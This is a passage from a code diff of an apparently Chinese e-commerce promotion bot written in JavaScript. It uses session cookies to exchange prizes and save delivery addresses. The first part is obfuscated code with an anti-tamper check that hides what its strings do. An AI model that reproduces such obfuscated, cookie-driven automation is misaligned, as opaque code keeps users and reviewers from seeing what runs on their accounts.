(_0x8c9cxa)=>{$[__Oxe7d56[0x57]](_0x8c9cx9,(_0x8c9cxb,_0x8c9cxc,_0x8c9cxd)=>{try{setActivityCookie(_0x8c9cxc);if(_0x8c9cxb){if(_0x8c9cxc&&  typeof _0x8c9cxc[__Oxe7d56[0x52]]!= __Oxe7d56[0x53]){if(_0x8c9cxc[__Oxe7d56[0x52]]== 493){console[__Oxe7d56[0x51]](__Oxe7d56[0x54]);$[__Oxe7d56[0x0]]= true}};console[__Oxe7d56[0x51]](`${__Oxe7d56[0x2]}${$[__Oxe7d56[0x55]](_0x8c9cxb,_0x8c9cxb)}${__Oxe7d56[0x2]}`);console[__Oxe7d56[0x51]](`${__Oxe7d56[0x2]}${_0x8c9cx2}${__Oxe7d56[0x56]}`)}else {dealReturn(_0x8c9cx2,_0x8c9cxd)}}catch(e){console[__Oxe7d56[0x51]](e,_0x8c9cxc)}finally{_0x8c9cxa()}})})}(function(_0x8c9cxe,_0x8c9cxf,_0x8c9cx10,_0x8c9cx11,_0x8c9cx12,_0x8c9cx13){_0x8c9cx13= __Oxe7d56[0x53];_0x8c9cx11= function(_0x8c9cx14){if( typeof alert!== _0x8c9cx13){alert(_0x8c9cx14)};if( typeof console!== _0x8c9cx13){console[__Oxe7d56[0x51]](_0x8c9cx14)}};_0x8c9cx10= function(_0x8c9cx15,_0x8c9cxe){return _0x8c9cx15+ _0x8c9cxe};_0x8c9cx12= _0x8c9cx10(__Oxe7d56[0x58],_0x8c9cx10(_0x8c9cx10(__Oxe7d56[0x59],__Oxe7d56[0x5a]),__Oxe7d56[0x5b]));try{_0x8c9cxe= __encode;if(!( typeof _0x8c9cxe!== _0x8c9cx13&& _0x8c9cxe=== _0x8c9cx10(__Oxe7d56[0x5c],__Oxe7d56[0x5d]))){_0x8c9cx11(_0x8c9cx12)}}catch(e){_0x8c9cx11(_0x8c9cx12)}})({})
 
 async function dealReturn(type, data) {
     let res = ''
@@ -611,14 +475,28 @@ async function dealReturn(type, data) {
                 break;
             case 'exchangePrize':
                 if (typeof res == 'object') {
+                    $.giftAddress = null
                     if (res.result && res.result === true) {
-                        $.taskStatus = data.taskStatus
                         if (res.errorMessage.indexOf("成功") != -1) {
                             console.log(res.errorMessage)
-                            $.allMessage += `兑换${$.prizeName}成功`
+                            $.giftAddress = res.data.giftAddress
+                            prizeName = $.giftAddress.prizeName
+                            $.allMessage += `兑换${prizeName}成功`
                         }
                     } else if (res.errorMessage) {
                         console.log(`${type} ${res.errorMessage || ''}`)
+                    } else {
+                        console.log(`${type} ${data}`)
+                    }
+                }
+                break;
+                case 'saveAddressWithGenerateId':
+            case 'saveAddress':
+                console.log(JSON.stringify(res))
+                if (typeof res == 'object') {
+                    if (res.result && res.result === true) {
+                        console.log(`地址填写成功！`)
+                        $.message += `填写成功\n`
                     } else {
                         console.log(`${type} ${data}`)
                     }
